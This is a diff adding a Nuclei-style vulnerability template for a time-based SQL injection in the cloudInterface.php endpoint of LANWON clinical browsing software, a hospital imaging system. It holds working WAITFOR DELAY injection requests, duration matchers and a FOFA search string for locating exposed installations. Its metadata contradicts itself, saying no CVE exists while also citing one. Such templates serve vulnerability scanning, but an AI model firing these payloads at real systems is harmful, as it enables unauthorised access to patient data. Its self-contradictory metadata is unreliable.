@@ -1,0 +1,30 @@
+id: lanwang-clinical-sqli-cloudinterface
+info:
+  name: "蓝网科技临床浏览系统cloudInterface接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="LANWON-临床浏览系统"
+
+    蓝网科技临床浏览系统在cloudInterface接口处理过程中，未对用户输入参数实施充分的SQL语法过滤与验证机制。攻击者可通过构造恶意SQL语句实现对数据库的未授权访问、数据篡改或敏感信息泄露，进而影响系统数据的完整性与可用性。
+
+    CVE编号：暂无
+    日期：2024-05-14
+    参考：厂商安全公告（需登录获取）
+  reference:
+  - CVE-2024-4653
+  tags: 蓝网科技临床浏览系统
+http:
+- raw:
+  - |
+    GET /xds/cloudInterface.php?INSTI_CODE=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /xds/cloudInterface.php?INSTI_CODE=1%27);WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
